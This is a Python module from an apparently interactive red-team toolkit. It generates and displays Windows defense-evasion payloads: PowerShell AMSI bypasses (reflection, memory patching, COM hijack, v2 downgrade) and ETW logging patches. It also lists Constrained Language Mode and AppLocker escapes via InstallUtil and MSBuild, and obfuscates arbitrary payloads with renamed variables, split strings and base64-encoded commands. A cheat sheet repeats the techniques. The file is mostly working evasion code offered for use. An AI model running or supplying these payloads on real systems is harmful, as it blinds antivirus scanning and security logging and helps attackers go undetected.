"""AMSI/ETW Bypass Module - Windows defense evasion: AMSI patching, ETW blinding, CLM bypass."""

import sys
import os
import random
import string

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel, show_knowledge)
from executor import run_with_preview, run_command

STAGE = "amsi"


def _rand_var(length=8):
    """Generate random variable name for obfuscation."""
    return ''.join(random.choices(string.ascii_lowercase, k=length))


# AMSI bypass techniques
AMSI_BYPASSES = {
    "Reflection (Matt Graeber)": {
        "desc": "Disable AMSI via .NET reflection — sets amsiInitFailed to true",
        "template": '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
    },
    "Memory Patch (Rasta Mouse)": {
        "desc": "Patch AmsiScanBuffer in memory to always return clean",
        "template": """$a=[Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils')
$b=$a.GetField('a'+'msi'+'Context','NonPublic,Static')
$c=$b.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt32($c,0x80070057)""",
    },
    "Forced Error": {
        "desc": "Force AMSI initialization error",
        "template": """$mem = [System.Runtime.InteropServices.Marshal]
$ptr = $mem::AllocHGlobal(9076)
$mem::Copy([Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3), 0, $ptr, 6)
$a = [Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils')
$f = $a.GetField('a'+'msiSession','NonPublic,Static')
$f.SetValue($null, $null)""",
    },
    "COM Hijack": {
        "desc": "Hijack AMSI COM server registration",
        "template": 'New-Item -Path "HKCU:\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32" -Value "C:\\IDontExist.dll" -Force',
    },
    "PowerShell Downgrade": {
        "desc": "Use PowerShell v2 which has no AMSI",
        "template": "powershell.exe -version 2 -noprofile -executionpolicy bypass",
    },
}

ETW_BYPASSES = {
    "ETW Patch (Adam Chester)": {
        "desc": "Patch EtwEventWrite to disable ETW logging",
        "template": """$a = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$b = $a.GetField('etwProvider','NonPublic,Static')
$c = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid())
$b.SetValue($null,$c)""",
    },
    "ETW via CSharp": {
        "desc": "Patch ntdll!EtwEventWrite return value",
        "template": """# Requires P/Invoke — patch first byte of EtwEventWrite to ret (0xC3)
$ntdll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE([Reflection.Assembly]::LoadWithPartialName('ntdll'))
# Use VirtualProtect + Marshal.WriteByte to patch""",
    },
}


def _amsi_bypass_menu(session):
    """Generate AMSI bypass payloads."""
    options = [(str(i+1), f"[bold]{name}[/bold] - {bp['desc']}") for i, (name, bp) in enumerate(AMSI_BYPASSES.items())]
    options.append(("0", "[bold]Back[/bold]"))
    choice = show_menu(options)

    if choice == "0":
        return

    idx = int(choice) - 1
    bypasses = list(AMSI_BYPASSES.items())
    if 0 <= idx < len(bypasses):
        name, bp = bypasses[idx]
        info(f"AMSI Bypass: {name}")
        console.print(f"\n[bold green]{bp['desc']}[/bold green]\n")

        payload = bp["template"]
        console.print(f"[yellow]--- Payload ---[/yellow]")
        console.print(f"[white]{payload}[/white]")
        console.print()

        if confirm("Obfuscate variable names?"):
            payload = _obfuscate_ps(payload)
            console.print(f"[yellow]--- Obfuscated ---[/yellow]")
            console.print(f"[white]{payload}[/white]")

        if confirm("Copy to clipboard (pbcopy/xclip)?"):
            run_command(f"echo '{payload}' | pbcopy 2>/dev/null || echo '{payload}' | xclip -selection clipboard 2>/dev/null")
            success("Copied to clipboard.")


def _etw_bypass_menu(session):
    """Generate ETW bypass payloads."""
    options = [(str(i+1), f"[bold]{name}[/bold] - {bp['desc']}") for i, (name, bp) in enumerate(ETW_BYPASSES.items())]
    options.append(("0", "[bold]Back[/bold]"))
    choice = show_menu(options)

    if choice == "0":
        return

    idx = int(choice) - 1
    bypasses = list(ETW_BYPASSES.items())
    if 0 <= idx < len(bypasses):
        name, bp = bypasses[idx]
        info(f"ETW Bypass: {name}")
        console.print(f"\n[bold green]{bp['desc']}[/bold green]\n")
        console.print(f"[white]{bp['template']}[/white]")


def _obfuscate_ps(payload):
    """Obfuscate PowerShell payload with random variable names."""
    # Simple variable renaming
    var_map = {}
    lines = payload.split('\n')
    result = []
    for line in lines:
        for var in ['$a', '$b', '$c', '$f', '$mem', '$ptr']:
            if var in line and var not in var_map:
                var_map[var] = f"${_rand_var()}"
        for old, new in var_map.items():
            line = line.replace(old, new)
        result.append(line)
    return '\n'.join(result)


def _clm_bypass(session):
    """Constrained Language Mode bypass techniques."""
    info("CLM (Constrained Language Mode) restricts PowerShell commands in locked-down environments.")

    techniques = [
        ("PowerShell v2 Downgrade", "powershell.exe -version 2"),
        ("PSByPassCLM", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /U C:\\temp\\bypass.exe"),
        ("MSBuild Bypass", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.csproj"),
        ("Runspace (C#)", "Use System.Management.Automation.Runspaces in compiled C# to get FullLanguage"),
        ("AppLocker Bypass Dirs", "Copy payload to: C:\\Windows\\Tasks\\, C:\\Windows\\Temp\\, C:\\Windows\\Tracing\\"),
    ]

    from rich.table import Table
    table = Table(title="CLM Bypass Techniques", show_header=True)
    table.add_column("#", style="cyan", width=3)
    table.add_column("Technique", style="bold")
    table.add_column("Command/Info")

    for i, (name, cmd) in enumerate(techniques, 1):
        table.add_row(str(i), name, cmd)

    console.print(table)


def _custom_obfuscate(session):
    """Obfuscate custom PowerShell payload."""
    info("Paste your PowerShell payload (type 'END' on a new line when done):")
    lines = []
    while True:
        line = ask("")
        if line.strip().upper() == "END":
            break
        lines.append(line)

    if not lines:
        error("No payload provided.")
        return

    payload = '\n'.join(lines)

    options = [
        ("1", "[bold]Variable rename[/bold]  - Random variable names"),
        ("2", "[bold]String concat[/bold]    - Break strings with +"),
        ("3", "[bold]Base64 encode[/bold]    - Encode entire payload"),
        ("4", "[bold]Invoke-Expression[/bold]- IEX wrapper"),
    ]
    choice = show_menu(options)

    if choice == "1":
        result = _obfuscate_ps(payload)
    elif choice == "2":
        result = payload.replace("AmsiUtils", "'Amsi'+'Utils'").replace("amsiInitFailed", "'amsi'+'Init'+'Failed'")
    elif choice == "3":
        import base64
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
        result = f'powershell -EncodedCommand {encoded}'
    elif choice == "4":
        import base64
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
        result = f'powershell -e {encoded}'
    else:
        return

    console.print(f"\n[yellow]--- Obfuscated Result ---[/yellow]")
    console.print(f"[white]{result}[/white]\n")


def _cheat_sheet():
    """AMSI/ETW bypass cheat sheet."""
    content = """# AMSI/ETW Bypass Cheat Sheet

## AMSI (Anti-Malware Scan Interface)
- Scans PowerShell, VBScript, JScript, .NET in-memory
- Hooks into: PowerShell, Office VBA, WSH, .NET CLR

## Quick AMSI Bypasses
```powershell
# Reflection bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# PowerShell v2 (no AMSI)
powershell.exe -version 2

# String obfuscation
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx') ( [TYpE]("{1}{0}"-F'F','rE'));
```

## ETW (Event Tracing for Windows)
```powershell
# Patch ETW provider
$a=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$b=$a.GetField('etwProvider','NonPublic,Static')
$c=New-Object System.Diagnostics.Eventing.EventProvider([Guid]::NewGuid())
$b.SetValue($null,$c)
```

## CLM (Constrained Language Mode)
```
# Check current mode
$ExecutionContext.SessionState.LanguageMode

# Bypass via PSBypassCLM, MSBuild, InstallUtil
```

## Obfuscation Tips
- Break strings: 'Am'+'si'+'Utils'
- Use -EncodedCommand for base64
- Randomize variable names
- Use .NET reflection instead of direct calls
"""
    show_knowledge(content)


def run(session):
    """AMSI/ETW Bypass module entry point."""
    show_stage_header("AMSI/ETW Bypass", "Windows defense evasion — AMSI patching, ETW blinding, CLM bypass")

    while True:
        options = [
            ("1", "[bold]AMSI Bypasses[/bold]    - Generate AMSI bypass payloads"),
            ("2", "[bold]ETW Bypasses[/bold]     - Disable Event Tracing"),
            ("3", "[bold]CLM Bypass[/bold]       - Constrained Language Mode escape"),
            ("4", "[bold]Custom Obfuscate[/bold] - Obfuscate your payload"),
            ("5", "[bold]Cheat Sheet[/bold]      - AMSI/ETW reference"),
            ("0", "[bold]Back to Main Menu[/bold]"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _amsi_bypass_menu(session)
        elif choice == "2":
            _etw_bypass_menu(session)
        elif choice == "3":
            _clm_bypass(session)
        elif choice == "4":
            _custom_obfuscate(session)
        elif choice == "5":
            _cheat_sheet()
